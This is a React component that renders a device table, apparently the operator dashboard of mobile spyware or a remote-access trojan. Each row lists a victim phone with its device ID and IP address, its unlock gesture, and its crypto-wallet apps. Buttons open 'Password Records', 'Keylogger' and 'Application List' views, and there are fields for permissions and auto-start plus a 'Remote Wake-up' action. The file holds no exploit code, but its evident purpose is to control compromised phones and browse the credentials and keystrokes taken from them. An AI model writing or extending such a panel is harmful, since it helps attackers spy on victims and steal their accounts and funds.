import React from "react";
import {
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  Box,
  Button,
  Typography,
  IconButton,
} from "@mui/material";
import { styled } from "@mui/material/styles";
import PaginationControls from "./PaginationControls.js";
import EditIcon from '@mui/icons-material/Edit';
import InfoIcon from '@mui/icons-material/Info';

const headerBgColor = "#f5f5f5";
const rowBgColorEven = "#ffffff";
const rowBgColorOdd = "#f9f9f9";
const borderColor = "#e0e0e0";

const StyledTableCell = styled(TableCell)(({ theme }) => ({
  borderBottom: `1px solid ${borderColor}`,
  borderRight: `1px solid ${borderColor}`,
  whiteSpace: "nowrap",
  padding: "6px 8px",
  color: "#666",
  fontSize: "13px",
}));

const StyledTableHeadCell = styled(StyledTableCell)({
  backgroundColor: headerBgColor,
  fontWeight: "bold",
  borderBottom: `1px solid ${borderColor}`,
  borderRight: `1px solid ${borderColor}`,
});

const CustomActionButton = styled(Button)(({ theme, color }) => ({
  backgroundColor: color === 'primary' ? "#1976d2" : color === 'secondary' ? "#ff5722" : "#ffffff",
  color: color === 'primary' || color === 'secondary' ? "white" : "#666",
  fontSize: "11px",
  margin: "0 2px",
  padding: "1px 6px",
  textTransform: "none",
  minWidth: "unset",
  "&:hover": {
    backgroundColor: color === 'primary' ? "#1565c0" : color === 'secondary' ? "#e64a19" : "#e0e0e0",
  },
}));

const GreyButtons = styled(Button)(({ theme }) => ({
  backgroundColor: "white",  
  color: "#333",               
  fontSize: "10px",            
  border: `1px solid ${borderColor}`,  
  margin: "1px 2px",
  padding: "2px 5px",          
  textTransform: "none",
  minWidth: "unset",
  "&:hover": {
    backgroundColor: "#e0e0e0",  
    borderColor: "#b0b0b0",      
  },
}));

const StyledTableRow = styled(TableRow)(({ index }) => ({
  backgroundColor: index % 2 === 0 ? rowBgColorEven : rowBgColorOdd,
}));

const IconBox = styled(Box)(({ theme }) => ({
  border: `1px solid ${borderColor}`, 
  borderRadius: "4px",  
  display: "inline-flex",
  alignItems: "center",
  justifyContent: "center",
  width: "30px", 
  height: "30px", 
}));

const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleChangeRowsPerPage }) => {
//   const rows = [
//     {
//       id: 1,
//       disp: <IconBox><IconButton size="small"><EditIcon fontSize="small" /></IconButton></IconBox>,
//       deviceId: "324312be2be17363",
//       versionRegion: " 3.5.3/HK 122.90.18.237",
//       creationTime: "2024-06-13 13:31:08",
//       lastUpdate: "2024-09-14 20:09:01",
//       digitalGesture: "Digital/Gesture/Mi...",
//       tpBitpe: " tpBitpe-/-",
//       imkuCoin: "imkuCoin-/-",
//       bobaFox: "bobaFox-/-",
//       plusFour: "-/-/-",
//       passwordRec: "Password Records",
//       keylogger: "Keylogger",
//       applicationList: "Application List",
//       tags: "Tags: 3",
//       brand: "OPPO",
//       model: "PEHM00",
//       versionParameter: "Version/Parameter: 12/13",
//       userId: "User ID",
//       accountProxy: "Account/Proxy: / Unassigned",
//       nickname: "Nickname:",
//       login: "Login:",
//       batteryPolicy: "Battery Policy:",
//       set: "Set",
//       smartAssistant: "Smart Assistant:",
//       enabledRunning: "Enabled Runn...",
//       settingsStartup: "Settings/Startup mo...",
//       hasBeenSet: "has been set. Last ...",
//       totalManual: "Total/Manual/Auto S...",
//       timesAndShutdown: "86 times/37 times/4...\nLast shutdown:",
//     },
   
//   ];

  return (
    <Paper
      sx={{
        padding: "16px",
        backgroundColor: "#ffffff",
        boxShadow: "0px 4px 10px rgba(0, 0, 0, 0.1)",
      }}
    >
      <Typography
        variant="h6"
        sx={{
          marginBottom: "16px",
          color: "#666",
          borderBottom: `1px solid ${borderColor}`,
          paddingBottom: "8px",
        }}
      >
        Equipment List
      </Typography>

      <Box sx={{ border: `1px solid ${borderColor}`, borderRadius: '4px' }}>
        <TableContainer >
          <Table stickyHeader sx={{ minWidth: 650, borderCollapse: "separate" }} size="small" aria-label="user table">
            <TableHead>
              <TableRow>
                <StyledTableHeadCell>Seri.</StyledTableHeadCell>
                <StyledTableHeadCell>Application Information</StyledTableHeadCell>
                <StyledTableHeadCell>Password Informa...</StyledTableHeadCell>
                <StyledTableHeadCell>Related</StyledTableHeadCell>
                <StyledTableHeadCell>Device Information</StyledTableHeadCell>
                <StyledTableHeadCell>User Information</StyledTableHeadCell>
                <StyledTableHeadCell>Set Status</StyledTableHeadCell>
                <StyledTableHeadCell>Self-start</StyledTableHeadCell>
                <StyledTableHeadCell>Open times</StyledTableHeadCell>
                <StyledTableHeadCell
                  sx={{
                    position: "sticky",
                    right: 0,
                    backgroundColor: headerBgColor,
                    zIndex: 2,
                    boxShadow: "-4px 0px 10px rgba(0, 0, 0, 0.1)",
                  }}
                >
                  operate
                </StyledTableHeadCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {rows.map((row, index) => (
                <StyledTableRow key={row.id} index={index}>
                  <StyledTableCell>{row.id}<br/>
                  <IconBox><IconButton size="small"><EditIcon fontSize="small" /></IconButton></IconBox>
                  </StyledTableCell>
                  <StyledTableCell>
                    Device ID: {row.deviceId}<br/>
                    Version/Region: {row.versionRegion}<br/>
                    Creation Time: {row.creationTime}<br/>
                    Last Update: {row.lastUpdate}
                  </StyledTableCell>
                  <StyledTableCell>
                    {row.digitalGesture}<br/>
                    {row.tpBitpe}<br/>
                    {row.imkuCoin}<br/>
                    {row.bobaFox}
                  </StyledTableCell>
                  <StyledTableCell>
                    {row.plusFour} <IconButton size="small"><InfoIcon fontSize="small" /></IconButton><br/>
                    <GreyButtons variant="outlined" size="small">{row.passwordRec}</GreyButtons><br/>
                    <GreyButtons variant="outlined" size="small">{row.keylogger}</GreyButtons><br/>
                    <GreyButtons variant="outlined" size="small">{row.applicationList}</GreyButtons><br/>
                  </StyledTableCell>
                  <StyledTableCell>
                    Brand: {row.brand}<br/>
                    Model: {row.model}<br/>
                    {row.versionParameter}<br/>
                    <Box sx={{ display: 'flex', alignItems: 'center' }}>
                      <IconBox>
                        <IconButton size="small">
                          <EditIcon fontSize="small" />
                        </IconButton>
                      </IconBox>
                      <Typography sx={{ marginLeft: '8px' }}>Label:</Typography>
                    </Box>
                  </StyledTableCell>
                  <StyledTableCell>
                    {row.userId}<br/>
                    Account/Proxy: / 
                    <Typography component="span" sx={{ color: 'red', fontWeight: 'bold' }}>
                      Unassigned
                    </Typography><br/>
                    {row.nickname}<br/>
                    {row.login}
                  </StyledTableCell>
                  <StyledTableCell>
                    Battery Policy:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{row.set}</Typography>
                    <GreyButtons variant="outlined" size="small">All permissions</GreyButtons><br/>
                    Smart Assistant:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{row.enabledRunning}</Typography>
                  </StyledTableCell>
                  <StyledTableCell>
                    Settings/Startup method:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>
                      No settings required.
                    </Typography>{" "}
                    Manually open.<br/>
                    Last startup:<br/>
                    2024-09-14 17:56:19
                  </StyledTableCell>
                  <StyledTableCell>
                    Total/Manual/Auto Start:<br/>
                    1 times/1 times/0 times<br/>
                    Last shutdown:<br/>
                    2024-09-14 17:56:19
                  </StyledTableCell>
                  <StyledTableCell
                    sx={{
                      position: "sticky",
                      right: 0,
                      background: "white",
                      zIndex: 1,
                      boxShadow: "-4px 0px 10px rgba(0, 0, 0, 0.1)",
                    }}
                  >
                    <Box sx={{ display: "flex", flexDirection: "column", gap: 0.5 , paddingRight: "95px" }}>
                      <CustomActionButton size="small" color="primary">Remote Wake-up</CustomActionButton>
                      <CustomActionButton size="small" color="secondary">View Rules</CustomActionButton>
                      <GreyButtons size="small">Add new rules</GreyButtons>
                      <GreyButtons size="small">Batch Import</GreyButtons>
                    </Box>
                  </StyledTableCell>
                </StyledTableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <PaginationControls
          page={page}
          rowsPerPage={rowsPerPage}
          setPage={setPage}
          totalItems={totalItems}
          handleChangeRowsPerPage={handleChangeRowsPerPage}
        />
      </Box>
    </Paper>
  );
};

export default DeviveListTable;
